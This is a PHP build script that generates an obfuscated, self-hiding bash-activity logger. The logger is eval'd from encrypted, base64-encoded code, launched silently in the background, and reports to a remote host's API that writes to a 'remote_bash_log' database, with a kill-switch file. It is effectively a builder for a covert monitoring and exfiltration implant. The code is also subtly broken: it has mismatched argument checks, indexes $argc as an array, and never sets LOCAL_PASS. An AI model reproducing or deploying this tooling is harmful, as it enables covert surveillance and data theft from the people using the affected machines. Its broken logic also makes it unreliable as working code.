<?php

require_once __DIR__ . '/randomAlphaNumericString.php';

if ($argc !== 3) {
    echo 'call this script the following way: php maker.php source-ip target-ip';
    die(1);
}
$pass = randomAlphaNumericString(256);
$iv = randomAlphaNumericString(8);
$crypt = 'blowfish';
$target = $argv[2];
$source = $argv[1];
$killkey = randomAlphaNumericString(512);
$killName = 'KILL_ME_' . randomAlphaNumericString(12);
$api = randomAlphaNumericString(12);
$logger = randomAlphaNumericString(3);
$key = randomAlphaNumericString(512);
$protocol = $argv[3] ?? 'http';
if (!is_dir(__DIR__ . '/dist')) {
    mkdir(__DIR__ . '/dist');
}
if (!is_dir(__DIR__ . '/dist/source')) {
    mkdir(__DIR__ . '/dist/source');
} else {
    foreach (array_diff(scandir(__DIR__ . '/dist/source'), ['.', '..']) as $file) {
        unlink(__DIR__ . '/dist/source/' . $file);
    }
}
if (!is_dir(__DIR__ . '/dist/target')) {
    mkdir(__DIR__ . '/dist/target');
} else {
    foreach (array_diff(scandir(__DIR__ . '/dist/target'), ['.', '..']) as $file) {
        unlink(__DIR__ . '/dist/target/' . $file);
    }
}
if (!is_dir(__DIR__ . '/dist/home')) {
    mkdir(__DIR__ . '/dist/home');
} else {
    foreach (array_diff(scandir(__DIR__ . '/dist/home'), ['.', '..']) as $file) {
        unlink(__DIR__ . '/dist/home/' . $file);
    }
}

file_put_contents(
    __DIR__ . "/dist/source/$logger.php",
    "<?php eval(openssl_decrypt(base64_decode("
        . "'" . openssl_encrypt(
            substr(
                file_get_contents('randomAlphaNumericString.php'),
                5
            )
            . "\n"
            . substr(
                str_replace(
                    ['##KILLKEY##', '##KILLNAME##'],
                    [$killkey, $killName],
                    file_get_contents('log.php')
                ),
                5
            ),
            $crypt,
            $pass,
            0,
            $iv
        ) . "'), getenv('LOCAL_CRYPT'), getenv('LOCAL_PASS'), OPENSSL_RAW_DATA, getenv('LOCAL_IV')));"
);
file_put_contents(
    __DIR__ . "/dist/source/$logger.sh",
    "TARGET_API=$api "
    . "TARGET_PROTOCOL=$protocol "
    . "TARGET_HOST=$target "
    . "TARGET_KEY=$key "
    . "LOCAL_CRYPT=$crypt "
    . "LOCAL_IV=$iv "
    . "LOCAL_CRYPT=$crypt "
    . "php $logger.php &>/dev/null &"
);
file_put_contents(
    __DIR__ . "/dist/target/$api.php",
    str_replace(
        ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
        [$source, $key, $argc[5] ?? 'false', ($argc[4] ?? 'sqlite:/var/log/remote_bash_log.sqlite')],
        file_get_contents(__DIR__ . '/api.php')
    )
);
file_put_contents(__DIR__ . "/dist/home/$logger.kill", "export $killName=$killkey");
